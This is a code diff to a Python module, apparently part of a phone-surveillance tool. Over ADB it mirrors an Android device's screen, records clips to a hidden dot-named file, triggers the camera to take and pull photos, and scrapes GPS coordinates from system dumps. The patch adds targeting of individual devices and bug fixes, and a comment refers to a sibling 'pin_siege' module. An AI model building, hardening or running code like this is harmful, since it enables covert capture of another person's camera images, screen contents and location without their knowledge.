@@ -24,11 +24,16 @@ _MAX_FRAME_BYTES = 12 * 1024 * 1024
 
 # ==================== MODULE 1: LIVE SCREEN MIRRORING ====================
 
-def capture_screen_frame():
+def capture_screen_frame(serial=None):
     """Capture a single screen frame as PNG bytes."""
     try:
+        # fix: optional serial targeting for multi-device hosts (item 5)
+        argv = [adb.adb_path]
+        if serial:
+            argv += ["-s", serial]
+        argv += ["exec-out", "screencap", "-p"]
         res = subprocess.run(
-            [adb.adb_path, "exec-out", "screencap", "-p"],
+            argv,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             timeout=8
@@ -48,12 +53,18 @@ def capture_screen_frame():
         return {"success": False, "error": "échec capture écran (voir logs)"}
 
 
-def capture_screen_jpeg(quality=60):
+def capture_screen_jpeg(quality=60, serial=None):
     """Capture screen and return as JPEG base64 for web streaming."""
+    # fix: name kept for compat, payload is PNG (item 10)
     try:
         # Capture as PNG first
+        # fix: optional serial targeting for multi-device hosts (item 5)
+        argv = [adb.adb_path]
+        if serial:
+            argv += ["-s", serial]
+        argv += ["exec-out", "screencap", "-p"]
         res = subprocess.run(
-            [adb.adb_path, "exec-out", "screencap", "-p"],
+            argv,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             timeout=8
@@ -82,7 +93,8 @@ def record_audio(duration=10):
     320x240 screen video track (NOT audio-only; kept for compatibility)."""
     try:
         duration = min(max(int(duration), 3), 60)  # Clamp 3-60s
-        remote_path = "/sdcard/.dc_audio_cap.mp4"
+        # fix: uuid remote filename — concurrent recordings collided on one path (item 6)
+        remote_path = f"/sdcard/.dc_audio_cap_{uuid.uuid4().hex[:8]}.mp4"
         local_path = str(TEMP_DIR / f"audrec_{uuid.uuid4().hex[:8]}_{int(time.time())}.mp4")
 
         try:
@@ -125,7 +137,7 @@ def record_audio(duration=10):
 
 # ==================== MODULE 3: CAMERA CAPTURE ====================
 
-def capture_camera(camera_id=0):
+def capture_camera(camera_id=0, serial=None):
     """
     Take a photo using the device camera.
     camera_id: 0 = back camera, 1 = front camera
@@ -137,9 +149,9 @@ def capture_camera(camera_id=0):
         # M37: BACK x2 envoyés exactement une fois, quel que soit le déroulement
         nonlocal backs_sent
         if camera_opened and not backs_sent:
-            adb.shell("input keyevent 4")  # BACK
+            adb.shell("input keyevent 4", serial=serial)  # BACK
             time.sleep(0.5)
-            adb.shell("input keyevent 4")  # BACK again
+            adb.shell("input keyevent 4", serial=serial)  # BACK again
             backs_sent = True
 
     try:
@@ -148,25 +160,34 @@ def capture_camera(camera_id=0):
 
         # Method: Open camera app, switch if needed, take photo
         # Step 1: Open camera
-        adb.shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
+        adb.shell("am start -a android.media.action.STILL_IMAGE_CAMERA", serial=serial)  # fix: serial (item 5)
         camera_opened = True
         time.sleep(3)
 
+        # fix: skip the blind tap when the camera app is not in the foreground
+        # (probe mCurrentFocus like pin_siege.py:107-127 does) (item 8)
+        camera_focused = False
+        focus_res = adb.shell("dumpsys window | grep mCurrentFocus", serial=serial)
+        focus_raw = (focus_res.get("stdout") or "")
+        camera_focused = "camera" in focus_raw.lower()  # camera package expected
+        if not camera_focused:
+            log.warning("capture_camera: caméra non au premier plan, switch/tap ignorés")
+
         # Step 2: If front camera requested, send switch event
-        if camera_id == 1:
+        if camera_id == 1 and camera_focused:  # fix: focus-gated (item 8)
             # Samsung camera switch button or generic toggle
-            adb.shell("input keyevent 1000054")  # KEYCODE_CAMERA_SWITCH (some devices)
+            adb.shell("input keyevent 1000054", serial=serial)  # KEYCODE_CAMERA_SWITCH (some devices)
             time.sleep(1)
             # Fallback: tap typical front camera switch location
-            adb.shell("input tap 120 120")
+            adb.shell("input tap 120 120", serial=serial)
             time.sleep(1)
 
         # Step 3: Take photo via shutter keyevent
-        adb.shell("input keyevent 27")  # KEYCODE_CAMERA
+        adb.shell("input keyevent 27", serial=serial)  # KEYCODE_CAMERA
         time.sleep(3)
 
         # Step 4: Find most recent photo
-        ls_res = adb.shell("ls -t /sdcard/DCIM/Camera/ 2>/dev/null | head -3")
+        ls_res = adb.shell("ls -t /sdcard/DCIM/Camera/ 2>/dev/null | head -3", serial=serial)
         if ls_res["success"] and ls_res["stdout"]:
             files = [f.strip() for f in ls_res["stdout"].splitlines() if f.strip()]
             if files:
@@ -177,7 +198,7 @@ def capture_camera(camera_id=0):
                     remote_path = f"/sdcard/DCIM/Camera/{newest}"
                     local_path = str(TEMP_DIR / f"camera_{camera_id}_{uuid.uuid4().hex[:8]}_{newest}")
 
-                    pull_res = adb.run_cmd(["pull", remote_path, local_path], timeout=15)
+                    pull_res = adb.run_cmd(["pull", remote_path, local_path], timeout=15, serial=serial)  # fix: serial (item 5)
                     _close_camera()
 
                     if pull_res["success"] and os.path.exists(local_path):
@@ -238,12 +259,15 @@ def get_gps_location():
 
         # Check if location is enabled
         loc_enabled = adb.shell("settings get secure location_providers_allowed")
-        result["location_enabled"] = loc_enabled.get("stdout", "").strip()
+        result["location_enabled"] = (loc_enabled.get("stdout") or "").strip()  # fix: None-value crash (item 7)
 
         # Method 1: dumpsys location — look for last known location
         dump = adb.shell("dumpsys location", timeout=10)
-        raw_output = dump.get("stdout", "")
+        raw_output = (dump.get("stdout") or "")  # fix: None-value crash (item 7)
         result["raw"] = raw_output[:2000]  # Cap raw output
+
+        # fix: sweep only the capped slice, not the full output (item 9)
+        capped_output = raw_output[:2000]
 
         # Parse location patterns
         # Pattern: "last location=Location[gps 48.856614,2.352222 hAcc=10.0 ..."
@@ -255,7 +279,7 @@ def get_gps_location():
         ]
 
         for pattern in patterns:
-            matches = re.findall(pattern, raw_output)
+            matches = re.findall(pattern, capped_output)  # fix: capped slice (item 9)
             if matches:
                 # Take the first valid match
                 for match in matches:
@@ -282,7 +306,7 @@ def get_gps_location():
                 'dumpsys activity service com.google.android.gms/.location.reporting.service.LocationReportingService 2>/dev/null | head -50',
                 timeout=8
             )
-            gms_out = gms_dump.get("stdout", "")
+            gms_out = (gms_dump.get("stdout") or "")  # fix: None-value crash (item 7)
             # L98: coordonnées GPS exigées — ancrées, signe explicite,
             # ≥3 décimales (versions/compteurs du dump ne matchent plus)
             coord_match = re.search(
@@ -304,7 +328,7 @@ def get_gps_location():
         # Method 3: try getting last known via settings
         if not result["success"]:
             geo_res = adb.shell("settings get secure location_providers_allowed")
-            result["providers_status"] = geo_res.get("stdout", "").strip()
+            result["providers_status"] = (geo_res.get("stdout") or "").strip()  # fix: None-value crash (item 7)
 
         return result
 
